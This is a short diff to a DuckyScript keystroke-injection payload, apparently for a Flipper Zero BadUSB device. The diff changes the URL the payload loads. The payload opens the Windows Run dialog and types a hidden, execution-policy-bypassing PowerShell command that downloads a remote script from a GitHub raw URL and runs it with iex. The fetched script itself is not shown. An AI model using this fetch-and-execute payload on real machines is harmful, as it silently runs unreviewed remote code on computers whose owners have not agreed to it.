@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm http://linktops1here | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/T-McBride/Flipper/main/usb_kb/Hopewell/Win_WikiQuickAccess.ps1 | iex
 ENTER
